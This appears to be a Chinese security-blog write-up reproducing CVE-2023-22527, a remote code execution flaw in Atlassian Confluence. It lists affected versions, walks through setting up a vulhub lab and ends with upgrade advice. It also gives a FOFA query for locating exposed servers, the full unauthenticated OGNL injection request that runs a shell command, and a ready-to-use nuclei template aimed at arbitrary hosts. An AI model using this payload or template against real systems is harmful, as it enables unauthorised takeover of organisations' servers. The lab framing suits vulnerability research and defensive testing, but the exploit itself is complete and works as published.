#  [漏洞复现]CVE-2023-22527   
原创 fgz  AI与网安   2024-02-11 07:44  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
Atlassian Confluence 模板注入代码执行漏洞  
  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
影响范围  
  
Atlassian Confluence Data Center and Server 8.0.x  
  
Atlassian Confluence Data Center and Server 8.1.x  
  
Atlassian Confluence Data Center and Server 8.2.x  
  
Atlassian Confluence Data Center and Server 8.3.x  
  
Atlassian Confluence Data Center and Server 8.4.x  
  
Atlassian Confluence Data Center and Server 8.5.0-8.5.3  
  
  
安全版本  
  
Atlassian Confluence Data Center and Server 8.5.4  
  
Atlassian Confluence Data Center 8.6.0  
  
Atlassian Confluence Data Center 8.7.1  
  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
Atlassian Confluence 是由 Atlassian 开发的企业级协作软件。2024年1月16日，Atlassian 官方披露 CVE-2023-22527 Atlassian Confluence 模板注入代码执行漏洞。攻击者可在无需登录的情况下构造恶意请求导致远程代码执行。Atlassian 官方评级严重，外界尚未流传相关利用。请Atlassian Confluence客户尽快升级。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
app="ATLASSIAN-Confluence" && body="由 Atlassian 合流8.5.3"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6AmpC8JQOYkGgQZVY8W0zdT4icJS6zMXY2OAyQSicwrpQqazsdJyJkwGA/640?wx_fmt=png&from=appmsg "")  
  
  
互联网暴露面不算大，但内网中数量是相当可观的。  
  
  
05  
  
—  
  
靶场搭建  
  
  
下载vulhub源码  
```
https://github.com/vulhub/vulhub
```  
  
将源码上传到靶场虚拟机，解压并修改名称  
```
unzip vulhub-master.zip


```  
  
然后进入漏洞对应目录  
```
cd vulhub/confluence/CVE-2023-22527
```  
  
启动容器  
```
docker compose up -d
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6ibsSlKFF8vER4cXW2hh6kCJRXevsUNSthlZhmDYDdkOmnloWnAjq4JQ/640?wx_fmt=png&from=appmsg "")  
  
经过漫长的等待之后，安装完成查看容器，是有两个容器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6WYkibQkwGWhRHmeZy6iaOKRCHsjiasVdoBM2ZrJ4gFwQkHhFRfge45vRA/640?wx_fmt=png&from=appmsg "")  
  
访问  
```
http://your-ip:8090
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6xdjtMp9exWh68648XGDM0eqISP1O1WsWNK1b21rxWvEY9uXcMUMKmA/640?wx_fmt=png&from=appmsg "")  
  
安装完之后需要按照提示申请一个license，按照安装向导配置数据库信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd67TycIVBaHeickrPpNozJ37tz0ZQDPgjbe8MsXHNicWQPR6Mv0Eia4Uia8A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6JtS8V2MvCNfSLfhibDoNhotj8kD4j8eqrYu6vxqzh9TS3rUPDRh0sAg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6R4PpgxbqC1qEG1uBhWOytc9g1dQ1oHhj6sUcTNIhiaVQ9Ribc9ljMNIg/640?wx_fmt=png&from=appmsg "")  
  
  
  
06  
  
—  
  
漏洞复现  
  
  
向靶场发送如下数据包  
```
POST /template/aui/text-inline.vm HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
 
label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6wazZxWrjrtRz3ib10l1FWmu1FtfFK75EpcD1LKibfSmgnL52iafVAtn5Q/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现成功  
  
  
  
07  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: CVE-2023-22527

info:
  name: Atlassian Confluence 模板注入代码执行漏洞
  author: fgz
  severity: critical
  description: Atlassian Confluence 是由 Atlassian 开发的企业级协作软件。2024年1月16日，Atlassian 官方披露 CVE-2023-22527 Atlassian Confluence 模板注入代码执行漏洞。攻击者可在无需登录的情况下构造恶意请求导致远程代码执行。Atlassian 官方评级严重，外界尚未流传相关利用。请Atlassian Confluence客户尽快升级。
  metadata:
    max-request: 1
    fofa-query: app="ATLASSIAN-Confluence" && body="由 Atlassian 合流8.5.3"
    verified: true
requests:
  - raw:
      - |+
        POST /template/aui/text-inline.vm HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
        Connection: close
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 285
        
        label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(header, 'X-Cmd-Response')"

```  
  
运行POC  
```
nuclei.exe -u http://192.168.40.130:8090/ -t mypoc/cve/CVE-2023-22527.yaml
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BNmE36xqZwDRM7ibVhryiapd6fLuCIO14QYQnsNRP3XcZnLiaMO8ZYibFClARwCeLhUtXj28z6NTSUdZA/640?wx_fmt=png&from=appmsg "")  
  
  
08  
  
—  
  
修复建议  
  
  
  
1、官方已经发布安全更新，建议升级至最新版本。  
  
2、利用安全组功能设置其仅对可信地址开放。  
  
  
  
09  
  
—  
  
福利领取  
  
  
关注公众号，在公众号主页点发消息发送关键字免费领取。  
  
  
  
  
**后台发送【****电子书**  
**】关键字获取学习资料网盘地址**  
  
****  
**后台发送【POC】关键字获取POC网盘地址**  
  
  
**后台发送【工具】获取渗透工具包**  
  
  
  
  
  
